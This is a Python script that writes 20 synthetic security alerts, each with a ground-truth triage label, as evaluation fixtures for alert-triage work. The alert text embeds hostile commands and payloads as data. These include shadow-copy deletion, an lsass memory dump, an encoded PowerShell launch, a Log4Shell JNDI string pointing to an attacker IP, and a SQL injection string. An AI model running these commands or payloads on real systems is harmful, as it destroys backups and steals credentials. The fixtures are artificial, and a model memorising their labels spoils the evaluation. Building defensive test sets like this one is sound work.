from __future__ import annotations
"""
Generate 20 synthetic security alerts + ground truth for eval.
Covers: ransomware, lateral movement, phishing, credential dumping,
        C2 comms, exploit attempts, privilege escalation, benign FPs.
"""
import json
import os
from pathlib import Path

OUT_DIR = Path(__file__).parent.parent / "eval" / "fixtures"
OUT_DIR.mkdir(parents=True, exist_ok=True)

ALERTS = [
    # ── Ransomware ────────────────────────────────────────────────────────────
    {
        "id": "ALERT-001",
        "source": "edr",
        "alert": (
            '{"event_type":"process","process_name":"vssadmin.exe",'
            '"command_line":"vssadmin.exe delete shadows /all /quiet",'
            '"parent_process":"cmd.exe","user":"SYSTEM","endpoint_id":"WIN-DC-01",'
            '"timestamp":"2024-03-15T02:14:33Z","file_hash":"a3f1b2c4d5e6f7a8b9c0d1e2f3a4b5c6"}'
        ),
        "ground_truth": {
            "triage_decision": "CRITICAL",
            "technique_ids":   ["T1490", "T1486"],
            "tactics":         ["Impact"],
            "severity":        "CRITICAL",
        },
    },
    {
        "id": "ALERT-002",
        "source": "edr",
        "alert": (
            '{"event_type":"file","process_name":"encrypt.exe",'
            '"file_path":"C:\\\\Users\\\\Documents\\\\report.docx.locked",'
            '"command_line":"encrypt.exe --key ransom123 C:\\\\Users",'
            '"endpoint_id":"WIN-WS-07","timestamp":"2024-03-15T02:20:11Z"}'
        ),
        "ground_truth": {
            "triage_decision": "CRITICAL",
            "technique_ids":   ["T1486"],
            "tactics":         ["Impact"],
            "severity":        "CRITICAL",
        },
    },
    # ── Credential Dumping ────────────────────────────────────────────────────
    {
        "id": "ALERT-003",
        "source": "edr",
        "alert": (
            '{"event_type":"process","process_name":"procdump64.exe",'
            '"command_line":"procdump64.exe -ma lsass.exe lsass.dmp",'
            '"parent_process":"powershell.exe","user":"Administrator",'
            '"endpoint_id":"WIN-SRV-02","timestamp":"2024-03-15T10:05:22Z"}'
        ),
        "ground_truth": {
            "triage_decision": "HIGH",
            "technique_ids":   ["T1003.001"],
            "tactics":         ["Credential Access"],
            "severity":        "HIGH",
        },
    },
    {
        "id": "ALERT-004",
        "source": "siem",
        "alert": (
            "SIEM ALERT: Mimikatz-like activity detected. "
            "Process: powershell.exe executed Invoke-Mimikatz. "
            "Target: lsass.exe memory read. Host: CORP-WS-12. "
            "User: john.smith. Time: 2024-03-16T14:33:01Z. "
            "EDR Detection Score: 94."
        ),
        "ground_truth": {
            "triage_decision": "HIGH",
            "technique_ids":   ["T1003.001", "T1059.001"],
            "tactics":         ["Credential Access", "Execution"],
            "severity":        "HIGH",
        },
    },
    # ── Lateral Movement ──────────────────────────────────────────────────────
    {
        "id": "ALERT-005",
        "source": "ids",
        "alert": (
            "IDS ALERT — Rule: LATERAL_MOVEMENT_RDP. "
            "Source: 10.0.1.55:49823 → Dest: 10.0.1.100:3389 (RDP). "
            "User: CORP\\\\svc_backup. Auth: NTLM. "
            "6 unique RDP connections in 3 minutes. "
            "Timestamp: 2024-03-17T08:12:44Z."
        ),
        "ground_truth": {
            "triage_decision": "HIGH",
            "technique_ids":   ["T1021.001", "T1078"],
            "tactics":         ["Lateral Movement"],
            "severity":        "HIGH",
        },
    },
    {
        "id": "ALERT-006",
        "source": "syslog",
        "alert": (
            "Mar 18 03:22:15 CORP-SRV-03 sshd[22814]: "
            "Accepted publickey for root from 192.168.5.22 port 44322 ssh2: "
            "RSA SHA256:Kx3qmNb8vZa1YpL9wE2rT6uYhJdC0sXw "
            "-- followed by 14 successive SSH logins to different hosts within 90 seconds."
        ),
        "ground_truth": {
            "triage_decision": "HIGH",
            "technique_ids":   ["T1021", "T1078.003"],
            "tactics":         ["Lateral Movement"],
            "severity":        "HIGH",
        },
    },
    # ── Phishing ──────────────────────────────────────────────────────────────
    {
        "id": "ALERT-007",
        "source": "siem",
        "alert": (
            "Email Security Alert: Potential phishing email detected. "
            "From: it-support@c0rp-helpdesk.com (spoofed domain). "
            "Subject: Urgent: Password Reset Required. "
            "Attachment: Password_Reset_Form.docm (macro-enabled). "
            "Recipients: 45 employees. Delivery time: 2024-03-18T09:00:01Z."
        ),
        "ground_truth": {
            "triage_decision": "HIGH",
            "technique_ids":   ["T1566.001"],
            "tactics":         ["Initial Access"],
            "severity":        "HIGH",
        },
    },
    {
        "id": "ALERT-008",
        "source": "edr",
        "alert": (
            '{"event_type":"process","process_name":"winword.exe",'
            '"child_process":"powershell.exe",'
            '"command_line":"powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAg",'
            '"document":"Invoice_March2024.docm","user":"sarah.jones",'
            '"endpoint_id":"CORP-WS-23","timestamp":"2024-03-18T09:47:12Z"}'
        ),
        "ground_truth": {
            "triage_decision": "CRITICAL",
            "technique_ids":   ["T1566.001", "T1059.001", "T1055"],
            "tactics":         ["Initial Access", "Execution"],
            "severity":        "CRITICAL",
        },
    },
    # ── C2 Communication ──────────────────────────────────────────────────────
    {
        "id": "ALERT-009",
        "source": "ids",
        "alert": (
            "IDS ALERT — Rule: COBALT_STRIKE_BEACON. "
            "Endpoint: CORP-WS-31 (10.0.2.88). "
            "Outbound HTTPS to 185.220.101.47:443. "
            "Beacon interval: ~60s. Response size: 4096 bytes (padded). "
            "JA3 fingerprint matches known Cobalt Strike C2. "
            "Timestamp: 2024-03-19T16:22:09Z."
        ),
        "ground_truth": {
            "triage_decision": "CRITICAL",
            "technique_ids":   ["T1071.001", "T1055"],
            "tactics":         ["Command and Control"],
            "severity":        "CRITICAL",
        },
    },
    {
        "id": "ALERT-010",
        "source": "syslog",
        "alert": (
            "Mar 20 11:03:44 CORP-WS-09 kernel: "
            "Outbound DNS query to randomstring.malware-c2.net (TXT record). "
            "Process: svchost.exe. Frequency: 120 queries/minute. "
            "DNS response contains base64-encoded data. "
            "Possible DNS tunneling C2 channel."
        ),
        "ground_truth": {
            "triage_decision": "HIGH",
            "technique_ids":   ["T1071", "T1041"],
            "tactics":         ["Command and Control", "Exfiltration"],
            "severity":        "HIGH",
        },
    },
    # ── Exploit Attempts ──────────────────────────────────────────────────────
    {
        "id": "ALERT-011",
        "source": "ids",
        "alert": (
            "IDS ALERT — CVE-2021-44228 Log4Shell Exploitation Attempt. "
            "Source IP: 203.0.113.42. Target: PROD-APP-01:8080. "
            "Payload in User-Agent: ${jndi:ldap://203.0.113.42:1389/Exploit}. "
            "HTTP 200 response returned. Possible successful exploitation. "
            "Timestamp: 2024-03-20T18:45:33Z."
        ),
        "ground_truth": {
            "triage_decision": "CRITICAL",
            "technique_ids":   ["T1190", "T1059.004"],
            "tactics":         ["Initial Access", "Execution"],
            "severity":        "CRITICAL",
        },
    },
    {
        "id": "ALERT-012",
        "source": "siem",
        "alert": (
            "WAF Alert: SQL injection attempt detected. "
            "Target: /api/login. Payload: ' OR '1'='1. "
            "Source IP: 198.51.100.77. Response: 500 Internal Server Error. "
            "5 attempts in 10 seconds. Possible automated scanner. "
            "Timestamp: 2024-03-21T13:10:55Z."
        ),
        "ground_truth": {
            "triage_decision": "MEDIUM",
            "technique_ids":   ["T1190"],
            "tactics":         ["Initial Access"],
            "severity":        "MEDIUM",
        },
    },
    # ── Privilege Escalation ──────────────────────────────────────────────────
    {
        "id": "ALERT-013",
        "source": "edr",
        "alert": (
            '{"event_type":"process","process_name":"cmd.exe",'
            '"command_line":"cmd.exe /c net localgroup administrators hacker /add",'
            '"parent_process":"mshta.exe","user":"guest",'
            '"endpoint_id":"CORP-WS-44","timestamp":"2024-03-21T20:01:17Z"}'
        ),
        "ground_truth": {
            "triage_decision": "HIGH",
            "technique_ids":   ["T1078.001", "T1059.003"],
            "tactics":         ["Privilege Escalation", "Execution"],
            "severity":        "HIGH",
        },
    },
    {
        "id": "ALERT-014",
        "source": "syslog",
        "alert": (
            "Mar 22 04:11:09 PROD-DB-01 sudo: "
            "pam_unix(sudo:auth): authentication failure; "
            "logname=www-data uid=33 euid=0 tty=/dev/pts/1 "
            "ruser=www-data rhost=  user=root. "
            "50 failed sudo attempts in 30 seconds."
        ),
        "ground_truth": {
            "triage_decision": "HIGH",
            "technique_ids":   ["T1078.003"],
            "tactics":         ["Privilege Escalation"],
            "severity":        "HIGH",
        },
    },
    # ── Data Exfiltration ─────────────────────────────────────────────────────
    {
        "id": "ALERT-015",
        "source": "ids",
        "alert": (
            "DLP ALERT: Large data transfer to external IP. "
            "Source: FINANCE-SRV-01. Destination: 91.195.240.118:443. "
            "Transfer size: 2.4 GB in 15 minutes. "
            "Process: rclone.exe (cloud sync tool). "
            "Data classification: Confidential. "
            "Timestamp: 2024-03-22T23:55:01Z."
        ),
        "ground_truth": {
            "triage_decision": "CRITICAL",
            "technique_ids":   ["T1041", "T1567"],
            "tactics":         ["Exfiltration"],
            "severity":        "CRITICAL",
        },
    },
    # ── Medium / Low severity ─────────────────────────────────────────────────
    {
        "id": "ALERT-016",
        "source": "siem",
        "alert": (
            "Authentication Alert: Multiple failed login attempts. "
            "User: admin@company.com. Source IP: 185.220.101.3 (Tor exit node). "
            "Failed attempts: 23 over 5 minutes. Account NOT locked. "
            "Timestamp: 2024-03-23T07:30:00Z."
        ),
        "ground_truth": {
            "triage_decision": "MEDIUM",
            "technique_ids":   ["T1078", "T1110"],
            "tactics":         ["Credential Access"],
            "severity":        "MEDIUM",
        },
    },
    {
        "id": "ALERT-017",
        "source": "syslog",
        "alert": (
            "Mar 24 10:00:01 CORP-WS-02 cron[1234]: "
            "(root) CMD (/usr/bin/curl -s http://update.software-vendor.com/v2/check)"
        ),
        "ground_truth": {
            "triage_decision": "LOW",
            "technique_ids":   [],
            "tactics":         [],
            "severity":        "LOW",
        },
    },
    # ── Benign / False Positives ──────────────────────────────────────────────
    {
        "id": "ALERT-018",
        "source": "edr",
        "alert": (
            '{"event_type":"network","process_name":"chrome.exe",'
            '"remote_ip":"142.250.80.46","remote_port":443,'
            '"bytes_sent":1024,"bytes_received":51200,'
            '"endpoint_id":"CORP-WS-05","user":"alice.wong",'
            '"timestamp":"2024-03-24T14:22:55Z"}'
        ),
        "ground_truth": {
            "triage_decision": "BENIGN",
            "technique_ids":   [],
            "tactics":         [],
            "severity":        "BENIGN",
        },
    },
    {
        "id": "ALERT-019",
        "source": "syslog",
        "alert": (
            "Mar 25 09:15:03 CORP-SRV-04 sshd[9981]: "
            "Accepted publickey for deploy from 10.0.0.5 port 52341 ssh2. "
            "This is the scheduled CI/CD deployment service account."
        ),
        "ground_truth": {
            "triage_decision": "BENIGN",
            "technique_ids":   [],
            "tactics":         [],
            "severity":        "BENIGN",
        },
    },
    {
        "id": "ALERT-020",
        "source": "ids",
        "alert": (
            "IDS ALERT — Rule: PORT_SCAN_DETECTED. "
            "Source: 10.0.0.200 (Internal — Nessus scanner). "
            "Targets: 10.0.0.0/24. Ports scanned: 1-1024. "
            "This matches scheduled vulnerability scan window (Tuesday 09:00-11:00). "
            "Timestamp: 2024-03-26T09:10:00Z."
        ),
        "ground_truth": {
            "triage_decision": "BENIGN",
            "technique_ids":   [],
            "tactics":         [],
            "severity":        "BENIGN",
        },
    },
]


def main():
    for a in ALERTS:
        alert_path = OUT_DIR / f"{a['id']}.txt"
        gt_path    = OUT_DIR / f"{a['id']}_gt.json"

        alert_path.write_text(a["alert"], encoding="utf-8")
        gt_path.write_text(json.dumps(a["ground_truth"], indent=2), encoding="utf-8")

    print(f"[generate] {len(ALERTS)} synthetic alerts + ground truth written to {OUT_DIR}")


if __name__ == "__main__":
    main()
